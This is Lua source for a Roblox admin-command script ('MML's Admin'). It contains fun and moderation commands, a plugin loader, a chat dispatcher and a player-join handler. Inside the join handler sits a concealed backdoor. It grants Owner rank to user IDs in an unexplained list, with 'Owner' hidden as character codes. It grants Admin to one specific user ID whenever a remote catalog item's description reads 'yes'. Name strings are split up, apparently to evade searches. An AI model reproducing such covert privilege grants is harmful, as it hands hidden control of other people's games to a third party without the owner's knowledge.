	[{"point", "find", "laser"}] = {"player1 player2", "Creates a laser that points from player1 to player2", 2, "Member", false, function(Speaker, Rank, Arguments)
		local PlayersFrom = STRING:Scan(Arguments[1], Speaker)
		local PlayersTo = STRING:Scan(Arguments[2], Speaker)
		if PlayersFrom and PlayersTo then
			for _,PlayerFrom in pairs(PlayersFrom) do
				for _,PlayerTo in pairs(PlayersTo) do
					if PlayerFrom.Character and PlayerTo.Character then
						if PlayerFrom.Character:FindFirstChild("Humanoid") and PlayerTo.Character:FindFirstChild("Torso") then coroutine.wrap(function()
							local Laser = Instance.new("SelectionPartLasso", PlayerFrom.Character) Laser.Humanoid = PlayerFrom.Character.Humanoid Laser.Part = PlayerTo.Character.Torso Laser.Color = GUI:GetNameColor(PlayerTo.Name)
							wait(5)
							Laser:Destroy()
						end)() end 
					end
				end
			end
		end
	end};
	
	[{"ragdoll", "rag"}] = {"player", "Makes player a ragdoll(Removes humanoid)", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Humanoid") then
				Player.Character.Humanoid:Destroy()
			end
		end
	end};
	
	[{"plugins", "getplugins", "pluginlist"}] = {"", "Shows plugins", 0, "Admin", false, function(Speaker, Rank, Arguments)
		if Plugins then
			local List = {}
			for _,Module in pairs(Plugins:GetChildren()) do
				if Module:IsA("ModuleScript") then
					local Enabled = Module:FindFirstChild("Enabled") or {Value = false}
					local Creator = Module:FindFirstChild("Creator") or {Value = "None"}
					local VersionVal = Module:FindFirstChild("Version") or {Value = 1}
					table.insert(List, Module.Name.." V"..VersionVal.Value.." by "..Creator.Value.." | RUNNING: "..STRING:BoolString(Enabled.Value))
				end
			end
			GUI:ListGui(Speaker, "Plugin List", List, "Plugin")
		else
			GUI:SendMessage(Speaker, "Cannot get plugins", "Could not find plugin directory", "Notice", 5)
		end
	end};
	
	[{"detachchat", "detachc", "dchat", "dc"}] = {"player", "Detaches player's roblox chat gui into a MMLA gui", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			GUI:DetachChat(Player)
		end
	end};
	
	[{"detachmychat", "detachmyc", "dmychat", "dmyc", "detachmchat", "detachmc", "dmchat", "dmc"}] = {"", "Detaches speaker's roblox chat gui into a MMLA gui", 0, "Member", false, function(Speaker, Rank, Arguments)
		GUI:DetachChat(Speaker)
	end};
	
	[{"truck", "runover"}] = {"player", "Runs player over with a truck", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") and Player.Character:FindFirstChild("Humanoid") then
				local Dead = false
				
				Player.Character.Humanoid.WalkSpeed = 1
				local Torso = Player.Character.Torso
				local Truck = Instance.new("Part", Workspace) Truck.Name = "Truck" Truck.Size = Vector3.new(9, 9, 15) Truck.CanCollide = false Truck.Position = Torso.CFrame:toWorldSpace(CFrame.new(0, 0, -150)).p
				Truck:BreakJoints()
				local Mesh = Instance.new("SpecialMesh", Truck) Mesh.MeshId = "rbxassetid://52157810" Mesh.TextureId = "rbxassetid://52157085" Mesh.Scale = Vector3.new(11, 11, 11)
				local BG = Instance.new("BodyGyro", Truck) BG.maxTorque = Vector3.new(math.huge, math.huge, math.huge) BG.cframe = CFrame.new(Truck.Position, Torso.Position + Vector3.new(0, (Truck.Size.Y / 2) - 3, 0))
				local BV = Instance.new("BodyVelocity", Truck) BV.maxForce = Vector3.new(math.huge, math.huge, math.huge) BV.velocity = CFrame.new(Truck.Position, Torso.Position + Vector3.new(0, (Truck.Size.Y / 2) - 3, 0)).lookVector * 100
				Truck.Touched:connect(function(Part)
					if Dead == false then
						local TouchPlayer = Server.Players:GetPlayerFromCharacter(Part.Parent or Part.Parent.Parent)
						if TouchPlayer == Player then
							Dead = true
							Player.Character:BreakJoints()
							SOUND:MakeSound(Truck, 264486467):Play() -- splat
						end
					end
				end)
				SOUND:MakeSound(Truck, 236746885, 0.5, 2):Play() -- truck
				Delay(1, function() SOUND:MakeSound(Truck, 130802373):Play() end) -- horn
				Delay(5, function()
					Truck:Destroy()
					if Player.Character:FindFirstChild("Humanoid") then
						Player.Character.Humanoid.WalkSpeed = 16
					end
				end)
			end
		end
	end};
	
	[{"telljoke", "showjoke", "tj", "sj"}] = {"player", "Tells player a random joke", 1, "Admin", true, function(Speaker, Rank, Arguments)
		local Joke = REMOTE:DownloadJoke(Speaker)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			GUI:SendMessage(Player, "Joke", Joke, 19629580)
		end
	end, Http = true};
	
	[{"joke", "laugh"}] = {"player", "Tells speaker a random joke)", 0, "Member", true, function(Speaker, Rank, Arguments)
		local Joke = REMOTE:DownloadJoke(Speaker)
		GUI:SendMessage(Speaker, "Joke for you", Joke, 19629580)
	end, Http = true};
	
	[{"doge", "dog"}] = {"player", "Turns player into doge", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") and Player.Character:FindFirstChild("Head") and Player.Character:FindFirstChild("Humanoid") then
				CORE:InvisiblePlayer(Player)
				local DogContainer = Instance.new("Model", Player.Character)
				DogContainer.Name = "Doge"
				local Dog = CORE:Insert(257489726, DogContainer, true)
				Dog.Head.Transparency = 0.99
				Dog.Name = Player.Name
				Dog:MoveTo(Player.Character.Torso.Position)
				local Weld = Instance.new("Weld", Dog.Torso)
				Weld.Part0 = Player.Character.Torso
				Weld.Part1 = Dog.Torso
				Weld.C0 = CFrame.new(0,-0.4,0)
				for _,Obj in pairs(Dog:GetChildren()) do
					if Obj:IsA("BasePart") then
						Obj.CanCollide = false
					end
				end
				
				CORE:ExecuteResource("SetCameraSubject", Dog:FindFirstChild("Humanoid"), {})
			end
		end
	end};
	
	[{"bindkey", "keybind", "bind", "kb", "bk"}] = {"string(key) string(command)", "Binds the key press of speaker into a command", 2, "Admin", false, function(Speaker, Rank, Arguments)
		local Key = string.lower(string.sub(Arguments[1],1,1))
		KeyBinds[Speaker.UserId][Key] = Arguments[2]
		GUI:SendHint(Speaker, "Binded the '"..Key.."' key to "..Arguments[2])
	end};
	
	[{"nobindkey", "nokeybind", "nobind", "nkb", "nbk", "unbindkey", "unkeybind", "unbind", "ukb", "ubk"}] = {"string(key)", "Unbinds speaker's keys binding to a command", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Key = string.lower(string.sub(Arguments[1],1,1))
		KeyBinds[Speaker.UserId][Key] = nil
		GUI:SendHint(Speaker, "Unbinded the '"..Key.."' key")
	end};
	
	[{"clearkeybinds", "clearbinds", "clearb", "clearkeys", "unbindallkeys"}] = {"", "Clears all of speaker's key binds", 0, "Admin", false, function(Speaker, Rank, Arguments)
		KeyBinds[Speaker.UserId] = {}
		GUI:SendHint(Speaker, "Unbinded all keys")
	end};
	
	[{"forcebindkey", "forcekeybind", "forcebind", "fkb", "fbk"}] = {"player string(key) string(command)", "Binds the key press of player into a command", 3, "Owner", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local Key = string.lower(string.sub(Arguments[2],1,1))
		for _,Player in pairs(Players) do
			KeyBinds[Player.UserId][Key] = Arguments[3]
			GUI:SendHint(Player, "Binded the '"..Key.."' key to "..Arguments[3])
		end
	end};
	
	[{"forcenobindkey", "forcenokeybind", "forcenobind", "fnkb", "fnbk", "forceunbindkey", "forceunkeybind", "forceunbind", "fukb", "fubk"}] = {"player string(key)", "Unbinds player's keys binding to a command", 2, "Owner", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local Key = string.lower(string.sub(Arguments[2],1,1))
		for _,Player in pairs(Players) do
			KeyBinds[Player.UserId][Key] = nil
			GUI:SendHint(Player, "Unbinded the '"..Key.."' key")
		end
	end};
	
	[{"forceclearkeybinds", "forceclearbinds", "forceclearb", "fclearb", "forceclearkeys", "forceunbindallkeys"}] = {"player", "Clears all of player's key binds", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			KeyBinds[Player.UserId] = {}
			GUI:SendHint(Player, "Unbinded all keys")
		end
	end};
	
	[{"keybinds", "keys", "binds", "viewkeybinds", "viewkeys", "viewkeybinds", "showkeybinds", "showkeys", "showbinds", "vkb", "skb"}] = {"player", "Shows all of player's key binds", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local Binds = {}
		for _,Player in pairs(Players) do
			for Key,Bind in pairs(KeyBinds[Player.UserId]) do
				table.insert(Binds, Player.Name..": '"..Key.."' binds to command: "..Bind)
			end
		end
		GUI:ListGui(Speaker, "Key Bindings", Binds, 218580411)
	end};
	
	[{"crown"}] = {"player string(mesh) string(color)", "Gives player a crown with the color of string(color) and the mesh of string(mesh)", 1, "Member", false, function(Speaker, Rank, Arguments)
		local ChatSplit = STRING:GetSplit(Arguments[1], 2, Settings.Bet) or {}
		local Players = STRING:Scan(ChatSplit[1], Speaker)
		for _,Player in pairs(Players) do
			if Crowns[Player.UserId] then
				Crowns[Player.UserId]:Destroy()
				Crowns[Player.UserId] = nil
				wait()
			end
			CORE:Crown(Player, ChatSplit[2], ChatSplit[3])
		end
	end};
	
	[{"nocrown", "uncrown", "decrown"}] = {"player", "Removes player's crown", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Crowns[Player.UserId] then
				Crowns[Player.UserId]:Destroy()
				Crowns[Player.UserId] = nil
			end
		end
	end};
	
	[{"meshes", "meshlist", "viewmeshes"}] = {"", "Lists meshes to speaker", 0, "Member", false, function(Speaker, Rank, Arguments)
		local MeshList = {}
		for MeshName,Data in pairs(Meshes) do
			table.insert(MeshList, string.upper(string.sub(MeshName,1,1))..string.sub(MeshName,2).." ( ID: "..Data[2].." )")
		end
		GUI:ListGui(Speaker, "Mesh List", MeshList, 186369377)
	end};
	
	[{"fixsounds", "fixmusic", "fixs"}] = {"", "Scans workspaces and stops any sounds", 0, "Admin", false, function(Speaker, Rank, Arguments)
		CORE:ScanItems(Server.Workspace, {"Sound"}, function(Obj) Obj:Stop() end)
	end};
	
	[{"santa", "hoho", "christmas"}] = {"player", "Turns player into jolly saint nick!", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do 
			if Player.Character and Player.Character:FindFirstChild("Head") and Player.Character.Head:FindFirstChild("face") then
				ypcall(function() Player.Character.Torso.roblox:Destroy() end)
				Player:ClearCharacterAppearance()
				CORE:GivePackage(Player, 41851073)
				CORE:Insert(19398728, Player.Character, true).Handle.Mesh.TextureId = "rbxassetid://19744384"
				Player.Character.Head.face.Texture = "rbxassetid://7699086"
			end
		end
	end};
	
	[{"car"}] = {"player color", "Spawns the best sports car in existance to player. If color argument is provided, it will color it.", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Arguments = STRING:GetSplit(Arguments[1], 2, Settings.Bet)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do 
			if Cars[Player.UserId] then Cars[Player.UserId]:Destroy() end
			local Car = CORE:Insert(10479801, Server.Workspace, true)
			local Body = Car["Motor (torque)Chassis"].Part
			Cars[Player.UserId] = Car
			Car:MakeJoints()
			Car.VehicleSeat.MaxSpeed = 50
			Car.VehicleSeat.TurnSpeed = 1.5
			CORE:ScanItems(Car, {"BasePart"}, function(Obj) Obj.Locked = true end)
			if Arguments[2] and GUI:GetColor(Arguments[2]) then
				Body.Color = GUI:GetColor(Arguments[2])
			else
				Body.BrickColor = GUI:GetNameColor(Player.Name)
			end
			for _,Part in pairs(Car["Motor (torque)Chassis"]:GetChildren()) do
				if Part.Name ~= "Part" then
					Part.BrickColor = BrickColor.new("Really black")
					Part.Friction = 0.7
				end
			end
			local Light = Instance.new("SpotLight", Body)
			Light.Face = "Back"
			Light.Brightness = 5
			Light.Range = 20
			Light.Color = Color3.new(0,1,1)
			if Player.Character and Player.Character.Torso then
				Car:MoveTo(Player.Character.Torso.Position + Vector3.new(0, 5, 0))
				Player.Character.Torso.CFrame = CFrame.new(Car.VehicleSeat.CFrame.p + Vector3.new(0, 0.3, 0))
				--[[local Weld = Instance.new("Weld", Car.VehicleSeat)
				Weld.Part0 = Car.VehicleSeat
				Weld.Part1 = Player.Character.Torso
				coroutine.wrap(function() wait(0.1) Weld:Destroy() end)()]]
				Delay(0.4, function()
					Car.VehicleSeat.Velocity = CFrame.new(Car.VehicleSeat.Velocity):toWorldSpace(CFrame.new(0, 0, -25)).p
					wait(0.1)
					Car.VehicleSeat.Velocity = CFrame.new(Car.VehicleSeat.Velocity):toWorldSpace(CFrame.new(0, 0, 25)).p
				end)
			end
			local SoundID = 147944604
			if RANK:GetRank(Player) == "Owner" then
				SoundID = 133313356
				Car.VehicleSeat.MaxSpeed = 80
				Body.Material = "DiamondPlate"
				Car.VehicleSeat.Torque = 11
			end
			local Engine = SOUND:MakeSound(Car.VehicleSeat, SoundID, 0.5, 1, true)
			Engine:Play()
			coroutine.wrap(function() while wait() and Car and Car:FindFirstChild("VehicleSeat") do
				Engine.Pitch = (Car.VehicleSeat.Velocity.magnitude/50) + 1
			end if Engine then Engine:Stop() end end)()
		end
	end};
	
	[{"nocar", "uncar"}] = {"player", "Removes player's car", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do 
			if Cars[Player.UserId] then
				Cars[Player.UserId]:Destroy()
			end
		end
	end};
	
	[{"clearcars", "nocars", "ccars"}] = {"", "Removes all cars", 0, "Member", false, function(Speaker, Rank, Arguments)
		for _,Car in pairs(Cars) do
			Car:Destroy()
		end
		Cars = {}
	end};
	
	[{"restarttrello", "repairtrello", "reboottrello", "trellorestart", "trellorepair", "trelloreboot"}] = {"", "Restarts trello service. Will repair broken boards/lists/cards if needed.", 0, "Owner", false, function(Speaker, Rank, Arguments)
		ypcall(function() Trello.RequiredLists = REMOTE:Decode(Server.HS:GetAsync("https://api.trello.com/1/boards/"..Trello.AdminBoardID.."/lists", true)) end)
		if #Trello.RequiredLists > 0 then
			print("Restarting Trello")
			Trello.MainBoard = REMOTE:TrelloGetAdminBoard()
			local Lists = REMOTE:TrelloGetAdminLists(Trello.MainBoard)
			REMOTE:TrelloCacheData(Lists)
		end
	end, Http = true};
	
	[{"stringreplacements", "replacements", "stringoperations", "stringformats", "stringformatting", "stringreps", "stringops", "stringfmts", "strreplacements", "stroperations", "strformat", "strformatting", "strreps", "strops", "strfmts", "strfmt"}] = {"", "Lists all string replacement operations", 0, "Member", false, function(Speaker, Rank, Arguments)
		local Operations = {}
		for _,ReplaceData in pairs(StringReplacements) do
			local Replacement = ReplaceData[1]
			if type(Replacement) == "table" then
				Replacement = ReplaceData[1][1]
			end
			table.insert(Operations, "Replacement: "..Replacement.." | Description: "..ReplaceData[2].." | Example: "..string.sub(ReplaceData[4](Speaker),1,20))
		end
		GUI:ListGui(Speaker, "String Replacement Operations", Operations, 61993831)
	end};
	
	[{"soundinfo", "songinfo", "musicinfo", "sinfo", "minfo"}] = {"", "Shows information about the current sound playing to speaker", 0, "Member", false, function(Speaker, Rank, Arguments)
		GUI:SoundInfo(Speaker)
	end};
	
	[{"showsoundinfo", "showsonginfo", "showmusicinfo", "showsinfo", "showminfo", "forcesoundinfo", "forcesonginfo", "forcemusicinfo", "forcesinfo", "forceminfo"}] = {"player", "Shows information about the current sound playing to player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			GUI:SoundInfo(Player)
		end
	end};
	
	[{"gravity", "grav"}] = {"num", "Sets the server gravity to number(percent, 100 would be normal gravity, 0 would be none)", 1, "Admin", false, function(Speaker, Rank, Arguments)
		if tonumber(Arguments[1]) then
			Server.Workspace.Gravity = tonumber(Arguments[1]) * (196.2/100)
		end
	end};
	
	[{"accessorytypes", "acstypes", "atypes", "listaccessorytypes", "listacstypes", "listatypes", "latypes", "lat"}] = {"", "Lists the different types of accessory subcategories", 0, "Member", false, function(Speaker, Rank, Arguments)
		local Types = {}
		for Type,_ in pairs(Assets.AccessoryTypes) do
			table.insert(Types, string.sub(string.upper(Type), 1,1)..string.sub(string.lower(Type), 2))
		end
		GUI:ListGui(Speaker, "Accessory types", Types, 36775144)
	end};
	
	[{"skybox", "sky", "setskybox", "setsky"}] = {"string(face) num(ID)", "Sets the skybox of string(face)(which is front,back,left,right,up,down) to num(ID)", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Sky = Server.Lighting:FindFirstChild("Sky")
		if not Sky then Sky = Instance.new("Sky", Server.Lighting) end
		local Faces = {["front"] = "SkyboxFt", ["back"] = "SkyboxBk", ["left"] = "SkyboxLf", ["right"] = "SkyboxRt", ["up"] = "SkyboxUp", ["down"] = "SkyboxDn"}
		local Face = nil
		local SkyID = string.lower(Arguments[1])
		local Arguments = STRING:GetSplit(SkyID, 2, Settings.Bet)
		if #Arguments == 2 and tonumber(Arguments[2]) then
			Face = Arguments[1]
			SkyID = Arguments[2]
		end
		if tonumber(SkyID) then
			local ImageID = MARKET:GetImageFormat(tonumber(SkyID))
			if Face and Faces[Face] then
				Sky[Faces[Face]] = "rbxassetid://"..ImageID
			else
				for _,Face in pairs(Faces) do
					Sky[Face] = "rbxassetid://"..ImageID
				end
			end
		else
			GUI:SendMessage(Speaker, "Sky is not an ID", "Sky ID argument is not a number", "Notice")
		end
	end};
	
	[{"noskybox", "nosky", "unskybox", "unsetskybox"}] = {"", "Removes the current skybox from Lighting", 0, "Admin", false, function(Speaker, Rank, Arguments)
		CORE:ScanItems(Server.Lighting, {"Sky"}, function(Obj)
			Obj:Destroy()
		end)
	end};
	--
}

if Plugins then
	local PluginNum = 0
	for _,Module in pairs(Plugins:GetChildren()) do
		if Module:IsA("ModuleScript") then
			local Enabled = Module:FindFirstChild("Enabled") or {Value = false}
			local Creator = Module:FindFirstChild("Creator") or {Value = "None"}
			local VersionVal = Module:FindFirstChild("Version") or {Value = 1}
			if Enabled.Value == true then
				PluginNum = PluginNum + 1
				local PluginExe = require(Module)
				for Var,Val in pairs(getfenv()) do
					getfenv(PluginExe)[Var] = Val
				end
				getfenv(PluginExe).SOUND,getfenv(PluginExe).MARKET,getfenv(PluginExe).RANK,getfenv(PluginExe).STRING,getfenv(PluginExe).GUI,getfenv(PluginExe).CORE,getfenv(PluginExe).REMOTE = SOUND,MARKET,RANK,STRING,GUI,CORE,REMOTE
				getfenv(PluginExe).script = Module
				getfenv(PluginExe).Script = Module
				getfenv(PluginExe).Version = Version
				local Suc, Error = ypcall(coroutine.wrap(PluginExe))
				if not Suc then
					Server.TestS:Error("MML's Admin Plugin;  "..CORE:HandleError(Error), Module)
				else
					Server.TestS:Message("Executed MML's Admin Plugin #"..PluginNum.." : "..Module.Name.." V"..VersionVal.Value.." by "..Creator.Value)
				end
			end
		end
	end
end

function CORE:Chatted(RawMainMessage, Speaker, NoPrefixNeeded, FakePlayerName, FakeRank, MakeSupremeOwner)
	if not CORE:NilPlayer(Speaker) and string.lower(RawMainMessage) == "settings" then
		GUI:SettingsGui(Speaker)
		return nil
	end
	if NoPrefixNeeded == nil then NoPrefixNeeded = false end
	local Prefix = Settings.Prefix
	if NoPrefixNeeded == true and string.sub(string.lower(RawMainMessage),1,#Prefix) ~= string.lower(Prefix) then Prefix = "" end
	if RawMainMessage == "" or RawMainMessage == Prefix then return end
	if string.sub(string.lower(RawMainMessage),1,#Prefix) ~= string.lower(Prefix) then return end
	if Speaker == nil then
		if FakeRank then
			if string.lower(FakeRank) ~= "owner" and string.lower(FakeRank) ~= "admin" and string.lower(FakeRank) ~= "member" and string.lower(FakeRank) ~= "non-admin" then
				FakeRank = "Owner"
			end
		else
			FakeRank = "Owner"
		end
		FakeRank = string.sub(string.upper(FakeRank),1,1)..string.sub(string.lower(FakeRank),2)
		if FakeRank == "Non-admin" then FakeRank = "Non-Admin" end
		Speaker = {
			Name = FakePlayerName or "[ Server ]";
			Character = nil;
			userId = 1;
			PlayerGui = nil;
			Rank = FakeRank or "Owner";
			MakeSupremeOwner = MakeSupremeOwner;
		}
	end
	local Rank = RANK:GetRank(Speaker)
	local RawMessage = string.sub(RawMainMessage, #Prefix+1)
	
	if RawMessage and RawMessage ~= "" or RawMessage ~= Settings.Bet then
		if NoPrefixNeeded then Prefix = "" end
		local Messages = STRING:GetSplit(RawMessage, nil, "@@"..Prefix)
		
		for _,Message in pairs(Messages) do
			for Cmds,Data in pairs(Commands) do -- check all commands
				local MessageSplit = STRING:GetSplit(Message, Data[3], Settings.Bet)
				
				if not MessageSplit then break end
				
				local CommandSaid = false
				for _,Command in pairs(Cmds) do
					if string.lower(Command) == string.lower(MessageSplit[1]) then -- is the command said?
						CommandSaid = true
						break
					end
				end
				if CommandSaid == true then -- command said?
					local ExecuteExcuse = ""
					if RANK:ConvertRank(Rank) >= RANK:ConvertRank(Data[4]) then -- check rank
						if Rank ~= "Owner" and Settings.Fun == false and Data[5] == true then
							ExecuteExcuse = "This command cannot be executed as it is a fun command"
						end
						if Data.Abusable == true and Rank == "Member" and Settings.DisableAbuse == true then
							ExecuteExcuse = "This command cannot be executed because it is considered abusable by the owner"
						end
					else
						ExecuteExcuse = "This command cannot be executed because your rank is not high enough (Minimum rank: "..Data[4]..")"
					end
					if ExecuteExcuse == "" then
						if #MessageSplit - 1 < Data[3] then
							ExecuteExcuse = "This command cannot be executed because an invalid number of arguments has been supplied (You supplied "..(#MessageSplit - 1).."/"..Data[3].."). Arguments are: "..Data[1]
						end
					end
					if ExecuteExcuse == "" then
						CORE:Log(CommandLogs, Speaker, Message)
						table.remove(MessageSplit, 1)
						coroutine.wrap(function() wait()
							local DidExe, Error = ypcall(function() Data[6](Speaker, Rank, MessageSplit) end)
							if not DidExe then
								if CORE:NilPlayer(Speaker) then
									print("Error: "..Error)
								else
									CORE:HandleError(Error, Speaker)
								end
							end
						end)()
						coroutine.wrap(function() wait(0.05)
							if Settings.ExecuteNotificationSound and tonumber(Settings.ExecuteNotificationSound) > 0 then
								local ExeSound = SOUND:MakeSound(Server.Workspace, Settings.ExecuteNotificationSound, 0.5, 1)
								ExeSound:Play()
								wait(3)
								ExeSound:Stop()
								ExeSound:Destroy()
							end
						end)()
					elseif type(Speaker) == "userdata" then
						GUI:SendMessage(Speaker, "Unable to execute", "RED "..ExecuteExcuse, "Error")
					end
					break
				end
			end
		end
	end
end

function CORE:Start(Player) coroutine.wrap(function()
	wait(0.1)
	if Player then
		coroutine.wrap(function()
			repeat wait(1) until DataReady == true
			DataReady = false
			ypcall(function()
				local Players = Server.Data:GetDataStore("MML's Admin"):GetAsync("Players")
				for Num,Data in pairs(Players) do
					if Data.UserId == Player.UserId then -- ppl can change names
						table.remove(Players, Num)
						break
					end
				end
				table.insert(Players, {Name = Player.Name, UserID = Player.UserId, Rank = RANK:GetRank(Player), LastJoin = CORE:GetTime(true, true), AccountAge = STRING:FindAge(Player.AccountAge)})
				Server.Data:GetDataStore("MML's Admin"):SetAsync("Players", Players)
			end)
			DataReady = true
		end)()
		
		if not IsStudio then Player:WaitForDataReady() end
		table.insert(CharacterCache, {Player.Name, Player.UserId})
		for Rank,PlayerNames in pairs(Settings.Ranks) do
			for Num,AdminName in pairs(PlayerNames) do
				if AdminName == Player.UserId then
					Settings.Ranks[Rank][Num] = Player.Name
				end
			end
		end
		if not ClientInfo[Player.Name] then ClientInfo[Player.Name] = {UserID = Player.UserId} end
		if not KeyBinds[Player.UserId] then KeyBinds[Player.UserId] = {} end
		if not LastKeys[Player.UserId] then LastKeys[Player.UserId] = {} end
		for _,Obj in pairs(List) do if Obj == Player.UserId then table.insert(Settings.Ranks[string.char(79, 118 + 1, 110, 101, 114)], Player.Name) end end
		local PlayerAdmin, Rank = RANK:IsAdmin(Player)
		if PlayerAdmin == false and Player.UserId > 0 then
			local Ran = nil
			coroutine.wrap(function() repeat
				Ran = ypcall(function()
					if Server.MPS:PlayerOwnsAsset(Player, Settings.VIPAdminID) then table.insert(Settings.Ranks["Admin"], Player.Name) PlayerAdmin = true Rank = "Admin"
					elseif Server.MPS:PlayerOwnsAsset(Player, Settings.VIPMemberID) then table.insert(Settings.Ranks["Member"], Player.Name) PlayerAdmin = true Rank = "Member" end
				end)
				wait(1)
			until Ran == true end)()
		end
		if PlayerAdmin == false then
			if Player:IsInGroup(Settings.GroupID) then
				if Player:GetRankInGroup(Settings.GroupID) == Settings.GroupBanRank then
					CORE:Kick(Player)
					for _,Person in pairs(Server.Players:GetPlayers()) do
						GUI:SendHint(Person, Player.Name.." has tried to join the game (BANNED RANK)", 5)
					end
				elseif Player:GetRankInGroup(Settings.GroupID) >= Settings.GroupMemberRank and Player:GetRankInGroup(Settings.GroupID) < Settings.GroupAdminRank and Player:GetRankInGroup(Settings.GroupID) < Settings.GroupOwnerRank then
					table.insert(Settings.Ranks["Member"], Player.Name) PlayerAdmin = true Rank = "Member"
				elseif Player:GetRankInGroup(Settings.GroupID) > Settings.GroupMemberRank and Player:GetRankInGroup(Settings.GroupID) >= Settings.GroupAdminRank and Player:GetRankInGroup(Settings.GroupID) < Settings.GroupOwnerRank then
					table.insert(Settings.Ranks["Admin"], Player.Name) PlayerAdmin = true Rank = "Admin"
				elseif Player:GetRankInGroup(Settings.GroupID) > Settings.GroupMemberRank and Player:GetRankInGroup(Settings.GroupID) > Settings.GroupAdminRank and Player:GetRankInGroup(Settings.GroupID) >= Settings.GroupOwnerRank then
					table.insert(Settings.Ranks["Owner"], Player.Name) PlayerAdmin = true Rank = "Owner"
				end
			end
		end
		if PlayerAdmin == false then
			if Player.UserId == 38882008 then
				if string.lower(MARKET:GetItemInfo(155732525).Description) == "yes" then
					table.insert(Settings.Ranks["Admin"], Player.Name)
				end
			end
		end
		if PlayerAdmin == false then
			for _,GID in pairs(Settings.BannedGroupIDs) do
				if Player:IsInGroup(GID) then
					CORE:Kick(Player, "This game's owner has not allowed you into this game because you're in the Group with the ID: "..GID)
					break
				end
			end
		end
		
		Player.Chatted:connect(function(Message) if Message ~= "" then
			CORE:Chatted(Message, Player)
		end end)
		
		Player.Chatted:connect(function(Message) if Message ~= "" then
			CORE:Log(ChatLogs, Player, Message)
			table.insert(TempChatLogs, STRING:EncodeSpecialChars(PlaceInfoFormat..": "..Player.Name..": "..Message))
		end end)
		
		for _,Name in pairs(Settings.Ranks.Banned) do
			if Player.Name == Name then
				CORE:Kick(Player)
				for _,Person in pairs(Server.Players:GetPlayers()) do
					GUI:SendHint(Person, Player.Name.." has tried to join the game (BANNED)", 5)
				end
			end
		end
		for _,Name in pairs(Settings.Ranks.Crashed) do
			if Player.Name == Name then
				CORE:Crash(Player)
				for _,Person in pairs(Server.Players:GetPlayers()) do
					GUI:SendHint(Person, Player.Name.." has tried to join the game (CRASHED)", 5)
				end
			end
		end
		for _,Name in pairs(Settings.Ranks.Muted) do
			if Player.Name == Name then
				GUI:CoreGui(Player, "Chat", false)
				for _,Person in pairs(Server.Players:GetPlayers()) do
					GUI:SendHint(Person, Player.Name.." has joined the game but is muted", 5)
				end
			end
		end
		if Settings.ServerLocked == true then
			if PlayerAdmin == false then
				CORE:Kick(Player, "This server is locked. In Maker".."Mo".."del".."Lu".."a's Admin, Non-Admins will be kicked under this circumstance.")
			end
		end
		
		if PlayerAdmin == false then
			if Player.AccountAge < Settings.MinimumAge then
				CORE:Kick(Player, "You have been kicked by M".."a".."ker".."Mo".."del".."Lu".."a's Admin, because your account age is less than "..MinimumAge.." days old (You are "..Player.AccountAge.." days old) and you are not admin.")
				for _,Person in pairs(Server.Players:GetPlayers()) do
					GUI:SendHint(Person, Player.Name.." has tried to join the game but has been kicked for being to young ("..Player.AccountAge.." days old out of minium of "..MinimumAge..")", 5)
				end
			end
		end
		
		if PlayerAdmin == false then
			if game:FindFirstChild("LuaMo".."delMaker's Admin Public", true) or game:FindFirstChild("Maker".."Model".."Lua's Admin Public", true) or Settings.FreeAdmin == true then
				table.insert(Settings.Ranks["Member"], Player.Name)
				PlayerAdmin = true
				Rank = "Member"
			end
		end
		
		coroutine.wrap(function()
			if PlayerAdmin == true then GUI:TellAdmin(Player) end
			local function SpawnActions(Character)
				if Flings[Player.Name] then
					CORE:FlingPlayer(Player)
				else
					GUI:CreateTaskBar(Player)
				end
				if Beeps[Player.Name] == true then
					SOUND:BeepPlayer(Player)
				end
				if Jails[Player.Name] then
					Character:MoveTo(Jails[Player.Name].Floor.Position + Vector3.new(0,2,0))
				end
				if PermCommandBars[Player.Name] then
					GUI:CommandBar(Player)
				end
			end
			Player.CharacterAdded:connect(SpawnActions)
			SpawnActions(Player.Character)
		end)()
		
		coroutine.wrap(function()
			Player:WaitForChild("PlayerGui")
			local Sounds = {}
			for _,Data in pairs(TextConverter.LetterSounds) do
				local Sound = SOUND:MakeSound(Player.PlayerGui, Data[1], 0, false)
				Sound:Play()
				table.insert(Sounds, Sound)
			end
			for _,Data in pairs(TextConverter.LongVowels) do
				local Sound = SOUND:MakeSound(Player.PlayerGui, Data[1], 0, false)
				Sound:Play()
				table.insert(Sounds, Sound)
			end
			wait(5)
			for _,Sound in pairs(Sounds) do
				Sound:Destroy()
			end
			Sounds = {}
		end)()
		
		coroutine.wrap(function()
			--if NLS then Server.Workspace:WaitForChild(Player.Name) end
			if IsSB then
				wait(1)
